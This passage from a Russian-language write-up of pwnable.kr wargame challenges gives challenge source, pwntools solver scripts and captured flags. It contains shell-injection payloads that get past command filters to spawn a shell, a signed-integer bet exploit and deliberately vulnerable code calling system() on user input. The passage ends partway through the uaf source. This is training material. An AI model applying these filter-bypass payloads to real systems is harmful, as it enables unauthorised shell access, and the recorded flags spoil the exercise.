        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -
</code></pre></div></div>

<p>Бинарная сиртировка тупа</p>

<p>Ну чё, посортируем</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># For SSHing in, and then running locally
# s = ssh(host="pwnable.kr", user="fd", port=2222, password="guest")
# conn = s.remote('localhost', 9007)
</span>
<span class="c1"># For running remotely
#conn = remote('pwnable.kr', 9007)
</span>
<span class="c1"># For running locally on pwnable.kr
# Всё оч медленно, поэтому, кроме как подконнектиться и запустить локально, вариков нет
</span><span class="n">conn</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">9007</span><span class="p">)</span>

<span class="n">conn</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Ready? starting in 3 sec</span><span class="sh">'</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>

        <span class="n">line</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span> <span class="c1"># [u'N=317', u'C=9']
</span>        <span class="c1"># print line
</span>        <span class="n">n</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>  <span class="c1"># 317
</span>        <span class="n">c</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>  <span class="c1"># 9
</span>
        <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">end</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span>

        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>

                <span class="n">mid</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># cast to ensure only whole numbers
</span>
                <span class="c1"># print('start: '+str(start))
</span>                <span class="c1"># print('mid: '+str(mid))
</span>                <span class="c1"># print('end: '+str(end))
</span>
                <span class="n">guess</span> <span class="o">=</span> <span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
                <span class="c1"># print guess
</span>                <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
                <span class="n">weight</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
                <span class="c1"># print weight
</span>
                <span class="k">if</span> <span class="n">weight</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># if divisible by 10, then no counterfeit in list
</span>                        <span class="n">start</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="k">else</span><span class="p">:</span> <span class="c1"># counterfeit in list
</span>                        <span class="n">end</span> <span class="o">=</span> <span class="n">mid</span>

        <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">start</span><span class="p">))</span> <span class="c1"># send final guess
</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>  <span class="c1"># Correct! (n)
</span>
<span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span> <span class="c1"># Congrats! get your flag
</span><span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span> <span class="c1"># {actual flag}
</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p>

<p><a href="https://zacheller.dev/pwnable-coin1">код отсюда</a></p>

<h1 id="blackjack"><a href="#header-1"></a>blackjack</h1>

<blockquote>
  <p>Hey! check out this C implementation of blackjack game!</p>

  <p>I found it online</p>

  <p>http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</p>

  <p>I like to give my flags to millionares.</p>

  <p>how much money you got?</p>

  <p>Running at : nc pwnable.kr 9009</p>
</blockquote>

<p>Видим код и реализацию betting</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">betting</span><span class="p">()</span> <span class="c1">//Asks user amount to bet</span>
<span class="p">{</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Enter Bet: $"</span><span class="p">);</span>
 <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>

 <span class="k">if</span> <span class="p">(</span><span class="n">bet</span> <span class="o">&gt;</span> <span class="n">cash</span><span class="p">)</span> <span class="c1">//If player tries to bet more money than player has</span>
 <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You cannot bet more money than you have."</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Bet: "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
</code></pre></div></div>

<p>Всего лишь два прохода, на втором нет проверки bet &gt; cash</p>

<p>2 варианта:</p>

<p>1) Ввести сначала чисто больше 500 –&gt; попадаем в if</p>

<p>2) Вводим число очень большое 2147483047</p>

<p>3) Выигрываем в партии –&gt; профит</p>

<p><br /></p>

<p>1) Вводим отрицательное число –&gt; - - = +</p>

<p>2) Проигрываем</p>

<p><code class="language-plaintext highlighter-rouge">YaY_I_AM_A_MILLIONARE_LOL</code></p>

<h1 id="lotto"><a href="#header-1"></a>lotto</h1>

<blockquote>
  <p>Mommy! I made a lotto program for my homework.</p>

  <p>do you want to play?</p>

  <p>ssh lotto@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">submit</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">play</span><span class="p">(){</span>
  
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Submit your 6 lotto bytes : "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Lotto Start!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="c1">//sleep(1);</span>

  <span class="c1">// generate lotto numbers</span>
  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"error. tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">lotto</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"error2. tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="mi">45</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>   <span class="c1">// 1 ~ 45</span>
  <span class="p">}</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  
  <span class="c1">// calculate lotto score</span>
  <span class="kt">int</span> <span class="n">match</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
      <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
        <span class="n">match</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// win!</span>
  <span class="k">if</span><span class="p">(</span><span class="n">match</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"bad luck...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">help</span><span class="p">(){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"- nLotto Rule -</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"for more details, follow the link below</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>

  <span class="c1">// menu</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">menu</span><span class="p">;</span>

  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"- Select Menu -</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"1. Play Lotto</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"2. Help</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"3. Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>

    <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">play</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">help</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"bye</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nl">default:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"invalid menu</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Проверяется один байт рандома с 6-ью байтами инпута, занчит все байты инпута должны быть одинаковыми, пишем скрипт и надеемся на рандом! Диапазон от 1 до 45</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="nf">ssh</span><span class="p">(</span><span class="sh">'</span><span class="s">lotto</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">pwnable.kr</span><span class="sh">'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">sh</span><span class="p">.</span><span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./lotto</span><span class="sh">'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">'</span><span class="s">------</span><span class="sh">'</span><span class="p">)</span>
  <span class="n">_</span> <span class="p">,</span> <span class="n">ans</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="k">if</span> <span class="sh">"</span><span class="s">bad</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
    <span class="k">break</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">sorry mom… I FORGOT to check duplicate numbers… :(</code></p>

<h1 id="cmd1"><a href="#header-1"></a>cmd1</h1>

<blockquote>
  <p>Mommy! what is PATH environment in Linux?</p>

  <p>ssh cmd1@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>cmd1.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"tmp"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">"PATH=/thankyouverymuch"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Notice the difference between single quotes and double quotes in argv:</p>

<p><code class="language-plaintext highlighter-rouge">$ ./test '$(echo abc)'</code></p>

<p><code class="language-plaintext highlighter-rouge">argv[1] = $(echo abc)</code></p>

<p><code class="language-plaintext highlighter-rouge">$ ./test "$(echo abc)"</code></p>

<p><code class="language-plaintext highlighter-rouge">argv[1] = abc</code></p>

<p>Single quotes pass the command without executing it.</p>

<p>Double quotes executes the command then passes its output (cannot pass the filter).</p>

<p><code class="language-plaintext highlighter-rouge">./cmd1 '$(printf "/bin/%s%s" "s" "h")'</code></p>

<p><code class="language-plaintext highlighter-rouge">/bin/cat /home/cmd1/flag</code></p>

<p><code class="language-plaintext highlighter-rouge">mommy now I get what PATH environment is for :)</code></p>

<h1 id="cmd2"><a href="#header-1"></a>cmd2</h1>

<blockquote>
  <p>Daddy bought me a system command shell.</p>

  <p>but he put some filters to prevent me from playing with it without his permission…</p>

  <p>but I wanna play anytime I want!</p>

  <p>ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"="</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"PATH"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"export"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"`"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">delete_env</span><span class="p">(){</span>
        <span class="kt">char</span><span class="o">**</span> <span class="n">p</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">environ</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">delete_env</span><span class="p">();</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">./cmd2 '$(printf "%bbin%bbash -p" "\57" "\57")'</code></p>

<p>(и гениальное)</p>

<p><code class="language-plaintext highlighter-rouge">./cmd2 '$(read x; echo $x)'</code></p>

<p><code class="language-plaintext highlighter-rouge">FuN_w1th_5h3ll_v4riabl3s_haha</code></p>

<h1 id="uaf"><a href="#header-1"></a>uaf</h1>

<blockquote>
  <p>Mommy, what is Use After Free bug?</p>

  <p>ssh uaf@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="c1"> </span><span class="cp">
#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="n">using</span> <span class="n">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="n">class</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">private:</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">give_shell</span><span class="p">(){</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="nl">protected:</span>
        <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
        <span class="n">string</span> <span class="n">name</span><span class="p">;</span>
<span class="nl">public:</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"My name is "</span> <span class="o">&lt;</span> <span class="n">name</span> <span class="o">&lt;</span> <span class="n">endl</span><span class="p">;</span>
                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"I am "</span> <span class="o">&lt;</span> <span class="n">age</span> <span class="o">&lt;</span> <span class="s">" years old"</span> <span class="o">&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="n">class</span> <span class="n">Man</span><span class="o">:</span> <span class="n">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public:</span>
        <span class="n">Man</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
                <span class="n">cout</span> <span class="o">&lt;</span> <span class="s">"I am a nice guy!"</span> <span class="o">&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="n">class</span> <span class="n">Woman</span><span class="o">:</span> <span class="n">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public:</span>
        <span class="n">Woman</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
